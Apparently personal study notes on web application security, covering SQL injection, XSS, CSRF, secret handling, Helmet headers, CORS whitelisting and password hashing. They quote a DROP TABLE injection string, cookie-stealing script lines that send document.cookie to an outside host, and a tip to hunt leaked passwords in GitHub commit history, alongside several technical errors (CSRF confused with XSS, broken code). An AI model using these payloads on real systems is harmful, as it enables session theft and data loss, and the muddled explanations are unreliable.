Security 


Injections (eg. SQL Injections)

Injections involve inserting code into another piece of code, eg. 

INSERT INTO table1 (email) VALUES ("";DROP TABLE table1;--)

- this will delete everything; the app expects an email value 


** Adding "or |==|--" is used to login without a password by attackers (|==| is always true)!


Code can be injected into submission fields.


Best Practices 

Bad:

    p.innerHTML = input

Good (sanitized):

    var textnode = document.createNode(input);
    p.appendChild(textnode);

    - ensures the result is text 


3 Ways to Prevent Injections 


1) Sanitize Input 

- only allow expected input types 

- can use a blacklist or a whitelist


2) Parameterized Queries (prepared statements)

- pre-compiles an SQL query, so you only provide the parameters 


3) Tools (object Relational Mappers)

- Knex.js (a SQL query builder for Postgres, MSSQL, MySQL, and more: http://knexjs.org/)


3rd Parety Libraries - Security Practices 

Snyk

- Snyk helps you find, fix and monitor known vulnerabilities in open source
https://www.npmjs.com/package/snyk

** NPM 6 has security as a built in feature 


Logging 

Insufficient Logging 

- logging is insufficient when logs don't allow timely detection of security breaches

Tools 

Winston (advanced logger, which can even be used in production):
https://www.npmjs.com/package/winston

Morgan (detailed server side logging): https://www.npmjs.com/package/morgan


HTTPS 

- encrypts HTTP requests between client and server 

- letsencrypt is a popular choice

- can also use Cloudflare (have a network of servers which are CDNs, protects against 
DDOS attacks)


XSS (Cross Site Scripting) and CSRF (Cross Site Request Forgery)


XSS 

- occurs whenever an application includes untrusted data in a new webpage, without proper 
validation (eg. updating a webpage with user provided JavaScript)

- attacker executes scripts in a victim's browser (eg. running a script as a command on a 
blog)

- used for session hijacking

For example, imagine that on a blog website, someone entered the following code as a 
comment:

window.location = 'hack.com?cookie=' document.cookie 

If the input isn't validated, and the JavaScript is run as-is, then everyone visiting the 
blog would have this code running in their browser as well.

(this will send the user (and the user's authentication cookie) to the attacker's 
website; their session can now be hijacked)

- basically, attackers run JavaScript code across sites

** generally speaking, using cookies is not secure 


CSRF 

Usually, we use HTTPS to encrypt communication between server and client, so 3rd parties 
can't spy on us. 

In CSRF, attackers create a bad URL with malicious code. If users are tricked into clicking it, it 
can complromise their information.

For example, a bad URL could be:

fetch('//httpbin.org/post', { method: 'POST', body: document.cookie })

- this cause users to make a POST request to a bad server, which steals their 
cookie 

This can be prevented with a Content Security Policy:

app.get('/', (req, res) => {

    res.cookie('session', '1', { httpOnly: true })
    res.cookie('session', '1', { secure: true })
    res.set({ 'Content-Security-Policy'" "script-src 'self' 'https://apis.google.com'" })
})

** There are npm packages for doing this automatically.


In summary:

1) Use client side input validation 

- modern frameworks like React and Angular use escaping characters to avoid this behaviour 
by default

- don't use eval() 

- don't use document.write() 

- set Content Security Policy headers 

- set 'secure' and 'httpOnly' for cookies 


Csurf 

- protection middleware against CSRF:
https://www.npmjs.com/package/csurf


Code Secrets 


Environment Variables: process.env.NODE_ENV 

- available outside the bos with create-react-app 

- development, it's set to DEVELOPMENT 

- npm run build sets it to PRODUCTION 

- we can also have environment variables for other environments, like QA for example 

- this can be used to make errors more generic on prod, for example (basically, we can 
have different behaviour on prod for certain sensitive features)


Setting Environment Variables 

The dotenv library, which comes with create-react-app, let's us set environment variables:
https://www.npmjs.com/package/dotenv


Commit History 

- always use a .gitignore file to execute files with sensitive data 

Fun trick - search for "remove passwords" on Github, and you can see millions of 
people's passwords in their commit history!! LOL


Headers (HTTP)

- useful to tell browsers what to do with some of the content that we've delivered, and 
useful to tell servers what to do with these HTTP requests 

https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers

Packages for secure headers include Helmet, which helps secure Express apps by setting 
various headers: https://github.com/helmetjs/helmet 

Using Helmet will automatically hide sensitive headers, and adds headers for security, like:

X-XSS-Protection 

X-Content-Type-Options

Strict-Transport-Security 


Access Control

- having restrictions on what authenticated users are and aren't allowed to do

- this is for cases where users are already authenticated; the question is what do 
they have access to 


Principle of Least Privelege

- always give the least amount of privelege possible 


Note on CORS (Cross Origin Resource Sharing)

Using app.use(cors()) let's anyone (even from other domains) get server resources.

This isn't good, since resources are being used up by random people. It doesn't follow the 
principle of least privelege.

Check the cors CORS docs for best practices, and use corsOptions with a whitelist 
(of good domains which we give access to our endpoints in our server).
corsOptions checks the whitelist to see if the domain should have access or not.


const whitelist = ['http://example.com', 'http://ex2.com']

const corsOptions = {

    origin: function (origin, callback) {

        if (whitelist.indexOf(origin) !== -1) {

            callback(null, true)
        } else {

            callback (new Error('Not allowed by CORS'))
        }
    }
}

app.use(cors(corsOptions))


Data Management 

- always have site backups (and encrypt backups)

- never have 1 point of failure 

- encrypt sensitive data in transition using HTTPS (be selective about what you encrypt;
use encryption for any data which identifies users)


Tools:

bcrypt, scrypt, Aragon2, pgcrypto (encrypt a few columns on a PostGres database)


Hash Passwords, and store the hash!! Not the password itself! 

- see the allKenora repo 

- https://www.npmjs.com/package/bcrypt


Password Verification

- use bcrypt compare (see the above npm link and the allKenora repo)

- salting a hash adds an extra layer of security by making brute force attacks very 
difficult 


Don't Trust Anyone 

- not at the server 

- not even at the client (the client may bombard the server
;this can be prevented with a ratelimiter)

- nowhere!! 


Ratelimiter 

A ratelimiter for Node.js backed by Redis: https://www.npmjs.com/package/ratelimiter


Authentication 

Authentication is the process of making sure the person on the other end is who 
they say they are (passwords and tokens are used)

- use 2 Factor Authentication 

- set 'httpOnly' and 'secure' headers to true 


OWASP (Open Web App Security Project)

- releases the top 10 biggest security issues on the web every year, as well as best 
practices 

- it's a good place to keep up to date!!




